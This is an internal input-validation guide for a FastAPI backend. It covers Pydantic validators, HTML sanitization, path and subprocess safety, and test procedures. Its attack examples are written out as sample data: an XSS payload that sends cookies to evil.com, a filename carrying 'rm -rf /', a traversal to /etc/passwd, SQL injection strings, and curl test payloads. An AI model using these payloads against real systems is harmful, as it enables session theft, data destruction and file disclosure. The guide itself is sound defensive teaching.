# Input Validation & Sanitization Guide

**Document**: Input Validation Best Practices
**Version**: 1.0
**Last Updated**: 2025-01-10
**Author**: Development Team
**Status**: Active

## Table of Contents

1. [Overview](#overview)
2. [Validation Principles](#validation-principles)
3. [Common Attack Vectors](#common-attack-vectors)
4. [Validation Utilities](#validation-utilities)
5. [Implementation Examples](#implementation-examples)
6. [Testing Procedures](#testing-procedures)
7. [Security Checklist](#security-checklist)

---

## Overview

Input validation and sanitization are critical security controls that prevent injection attacks, data corruption, and application compromise. This guide documents the input validation strategy for the WWMAA backend application.

### Key Objectives

- **Prevent Injection Attacks**: SQL, XSS, command injection, path traversal
- **Ensure Data Integrity**: Validate data types, formats, and ranges
- **Sanitize User Content**: Remove dangerous HTML/scripts from user-generated content
- **Defense in Depth**: Multiple layers of validation (client, server, database)

### Security Principles

1. **Whitelist Over Blacklist**: Define what IS allowed, not what ISN'T
2. **Validate Early**: Reject invalid input at the API boundary
3. **Sanitize Output**: Escape/encode data before rendering
4. **Never Trust Input**: Validate ALL input from ANY source
5. **Fail Securely**: Reject by default, require explicit validation

---

## Validation Principles

### 1. Type Validation

Use Pydantic models for automatic type validation:

```python
from pydantic import BaseModel, EmailStr, Field

class UserCreateRequest(BaseModel):
    email: EmailStr  # Validates email format
    password: str = Field(min_length=8, max_length=128)
    age: int = Field(ge=13, le=120)  # Age between 13-120
```

### 2. Length Constraints

Always specify min/max lengths:

```python
class EventCreateRequest(BaseModel):
    title: str = Field(min_length=1, max_length=200)
    description: str = Field(max_length=10000)
```

### 3. Pattern Matching

Use regex patterns for structured data:

```python
from pydantic import field_validator

class ProfileUpdate(BaseModel):
    username: str = Field(pattern=r'^[a-zA-Z0-9_-]{3,30}$')
    zip_code: str = Field(pattern=r'^\d{5}(-\d{4})?$')
```

### 4. Custom Validators

Implement custom validation logic:

```python
@field_validator('password')
@classmethod
def validate_password_strength(cls, v):
    from backend.utils.validation import validate_password_strength

    is_valid, errors = validate_password_strength(v)
    if not is_valid:
        raise ValueError('; '.join(errors))
    return v
```

---

## Common Attack Vectors

### SQL Injection

**What it is**: Inserting malicious SQL code into queries to manipulate the database.

**Prevention**:
- ✅ Use parameterized queries (ZeroDB does this automatically)
- ✅ Validate input with Pydantic models
- ✅ Use paranoid SQL detection as additional layer

**Example Attack**:
```
Input: email = "admin'--"
Malicious Query: SELECT * FROM users WHERE email = 'admin'--'
```

**Our Defense**:
```python
from backend.utils.validation import detect_sql_injection

@field_validator('email', 'name')
@classmethod
def validate_no_sql_injection(cls, v):
    if detect_sql_injection(v, strict=False):
        raise ValueError("Invalid characters detected")
    return v
```

### Cross-Site Scripting (XSS)

**What it is**: Injecting malicious JavaScript into web pages viewed by other users.

**Prevention**:
- ✅ Sanitize HTML in user-generated content
- ✅ Use Content Security Policy (CSP) headers
- ✅ Escape output when rendering

**Example Attack**:
```html
Input: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

**Our Defense**:
```python
from backend.utils.validation import sanitize_html

@field_validator('bio', 'description')
@classmethod
def sanitize_html_content(cls, v):
    if v:
        return sanitize_html(v)
    return v
```

### Path Traversal

**What it is**: Accessing files outside allowed directories using `../` sequences.

**Prevention**:
- ✅ Validate file paths against allowed directories
- ✅ Use `safe_join_path()` utility
- ✅ Never concatenate user input into file paths

**Example Attack**:
```
Input: filename = "../../etc/passwd"
Result: Server reads /etc/passwd instead of /uploads/file.txt
```

**Our Defense**:
```python
from backend.utils.security import is_safe_path, safe_join_path

# Validate path
if not is_safe_path(user_path, UPLOADS_DIR):
    raise ValueError("Invalid file path")

# Safe path joining
safe_path = safe_join_path(UPLOADS_DIR, user_filename)
if safe_path is None:
    raise ValueError("Path traversal detected")
```

### Command Injection

**What it is**: Executing shell commands by injecting metacharacters.

**Prevention**:
- ✅ NEVER use `shell=True` in subprocess calls
- ✅ Pass commands as lists, not strings
- ✅ Use `safe_subprocess_run()` wrapper
- ✅ Whitelist allowed executables

**Example Attack**:
```python
# DANGEROUS - Never do this!
filename = "file.jpg; rm -rf /"
os.system(f"convert {filename} output.png")
```

**Our Defense**:
```python
from backend.utils.security import safe_subprocess_run

# Safe subprocess execution
safe_subprocess_run([
    "/usr/bin/convert",  # Absolute path
    input_file,
    output_file
])
```

### File Upload Attacks

**What it is**: Uploading malicious files (malware, web shells, executable code).

**Prevention**:
- ✅ Validate file extensions (whitelist)
- ✅ Validate MIME types
- ✅ Verify magic bytes (actual file type)
- ✅ Limit file sizes
- ✅ Scan file content
- ✅ Store with random UUIDs

**Example Attack**:
```
Upload: shell.php.jpg (PHP web shell disguised as image)
```

**Our Defense**:
```python
from backend.utils.file_upload import validate_image_upload

is_valid, error = validate_image_upload(uploaded_file)
if not is_valid:
    raise ValueError(error)

# Store with random UUID (never use original filename)
file_id = uuid4()
storage_path = f"{UPLOADS_DIR}/{file_id}.{extension}"
```

---

## Validation Utilities

### Email Validation

```python
from backend.utils.validation import validate_email, validate_email_or_raise

# Basic validation
if validate_email("user@example.com"):
    # Email is valid
    pass

# With exception
try:
    email = validate_email_or_raise("user@example.com", check_dns=True)
except ValueError as e:
    # Handle invalid email
    pass
```

### Phone Number Validation

```python
from backend.utils.validation import validate_phone_number, normalize_phone_number

# Validate E.164 format
if validate_phone_number("+12025551234"):
    pass

# Normalize to E.164
phone = normalize_phone_number("(202) 555-1234")  # Returns: +12025551234
```

### URL Validation

```python
from backend.utils.validation import validate_url, sanitize_url

# Validate with scheme check
if validate_url("https://wwmaa.com"):
    pass

# Validate with domain whitelist
allowed_domains = ['wwmaa.com', 'youtube.com']
if validate_url(url, allowed_domains=allowed_domains):
    pass

# Sanitize URL
clean_url = sanitize_url(user_url)
if clean_url is None:
    raise ValueError("Invalid URL")
```

### Password Strength Validation

```python
from backend.utils.validation import validate_password_strength

is_valid, errors = validate_password_strength(password)
if not is_valid:
    return {"error": '; '.join(errors)}
```

### HTML Sanitization

```python
from backend.utils.validation import sanitize_html, strip_html

# Sanitize HTML (allow safe tags)
clean_html = sanitize_html(user_input)

# Strip all HTML tags
plain_text = strip_html(user_input)
```

### File Upload Validation

```python
from backend.utils.file_upload import validate_image_upload, validate_document_upload

# Validate image upload
is_valid, error = validate_image_upload(uploaded_file)
if not is_valid:
    raise HTTPException(status_code=400, detail=error)

# Validate document upload
is_valid, error = validate_document_upload(uploaded_file)
```

### Path Validation

```python
from backend.utils.security import is_safe_path, safe_join_path

# Check if path is safe
if not is_safe_path(user_path, ALLOWED_DIR):
    raise ValueError("Invalid path")

# Safely join paths
safe_path = safe_join_path(BASE_DIR, user_path)
if safe_path is None:
    raise ValueError("Path traversal detected")
```

---

## Implementation Examples

### Example 1: User Registration Endpoint

```python
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel, EmailStr, Field, field_validator
from backend.utils.validation import validate_password_strength, strip_html

router = APIRouter()

class UserRegisterRequest(BaseModel):
    email: EmailStr
    password: str = Field(min_length=8, max_length=128)
    first_name: str = Field(min_length=1, max_length=100)
    last_name: str = Field(min_length=1, max_length=100)

    @field_validator('email')
    @classmethod
    def email_lowercase(cls, v):
        return v.lower()

    @field_validator('password')
    @classmethod
    def validate_password(cls, v):
        is_valid, errors = validate_password_strength(v)
        if not is_valid:
            raise ValueError('; '.join(errors))
        return v

    @field_validator('first_name', 'last_name')
    @classmethod
    def sanitize_name(cls, v):
        return strip_html(v).strip()

@router.post("/auth/register")
async def register_user(request: UserRegisterRequest):
    # Pydantic automatically validates input
    # All fields are validated before reaching this point

    # Create user...
    return {"message": "User registered successfully"}
```

### Example 2: Event Creation Endpoint

```python
from backend.utils.validation import sanitize_html, detect_sql_injection

class EventCreateRequest(BaseModel):
    title: str = Field(min_length=1, max_length=200)
    description: Optional[str] = Field(None, max_length=10000)
    location: Optional[str] = Field(None, max_length=500)

    @field_validator('description')
    @classmethod
    def sanitize_description(cls, v):
        if v:
            return sanitize_html(v)
        return v

    @field_validator('title', 'location')
    @classmethod
    def validate_text(cls, v):
        if v and detect_sql_injection(v, strict=False):
            raise ValueError("Invalid characters detected")
        return v
```

### Example 3: File Upload Endpoint

```python
from fastapi import UploadFile, File
from backend.utils.file_upload import validate_image_upload
from backend.utils.security import generate_secure_token

@router.post("/media/upload")
async def upload_media(file: UploadFile = File(...)):
    # Validate file
    is_valid, error = validate_image_upload(file)
    if not is_valid:
        raise HTTPException(status_code=400, detail=error)

    # Generate secure filename (never use original filename)
    file_id = generate_secure_token(16)
    extension = file.filename.rsplit('.', 1)[1].lower()
    storage_filename = f"{file_id}.{extension}"

    # Save file to secure location
    storage_path = safe_join_path(UPLOADS_DIR, storage_filename)
    if storage_path is None:
        raise HTTPException(status_code=400, detail="Invalid filename")

    # Save file...
    return {"file_id": file_id, "url": f"/media/{storage_filename}"}
```

---

## Testing Procedures

### Unit Tests

Run input validation tests:

```bash
pytest backend/tests/test_input_validation.py -v
```

### Fuzzing Tests

Run automated fuzzing tests:

```bash
# Start backend server
uvicorn backend.main:app --reload

# Run fuzzer (in another terminal)
python backend/scripts/fuzz_test.py --target http://localhost:8000
```

### Manual Security Testing

Test common attack payloads manually:

```bash
# SQL Injection
curl -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\''--","password":"test"}'

# XSS
curl -X POST http://localhost:8000/api/events \
  -H "Content-Type: application/json" \
  -d '{"title":"<script>alert('\''XSS'\'')</script>","description":"test"}'

# Path Traversal
curl http://localhost:8000/api/media/../../etc/passwd
```

**Expected Results**: All malicious payloads should be rejected with `400` or `422` status codes.

---

## Security Checklist

### Pre-Deployment Checklist

- [ ] All API endpoints use Pydantic models for validation
- [ ] All text inputs have min/max length constraints
- [ ] All user-generated HTML is sanitized
- [ ] All file uploads are validated (extension, MIME type, size, magic bytes)
- [ ] All file paths use `safe_join_path()` utility
- [ ] No `subprocess` calls use `shell=True`
- [ ] All passwords validated with strength requirements
- [ ] All emails validated with EmailStr
- [ ] SQL injection detection enabled for critical fields
- [ ] Rate limiting configured on all endpoints
- [ ] Security headers configured (CSP, HSTS, X-Frame-Options)
- [ ] All tests passing with 80%+ coverage
- [ ] Fuzzing tests completed with no critical vulnerabilities
- [ ] pip-audit run with no high/critical vulnerabilities

### Code Review Checklist

When reviewing code, check for:

- [ ] Input validation present on all API endpoints
- [ ] Pydantic models used for request validation
- [ ] Custom validators implemented where needed
- [ ] HTML sanitization on user-generated content
- [ ] File uploads properly validated
- [ ] No string concatenation in file paths or SQL queries
- [ ] No `shell=True` in subprocess calls
- [ ] Sensitive data properly hashed/encrypted
- [ ] Error messages don't leak sensitive information
- [ ] Tests cover validation logic

---

## Additional Resources

- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Pydantic Documentation](https://docs.pydantic.dev/)
- [FastAPI Security Documentation](https://fastapi.tiangolo.com/tutorial/security/)

---

**Document Maintenance**: This document should be reviewed and updated quarterly or when significant changes are made to validation logic.
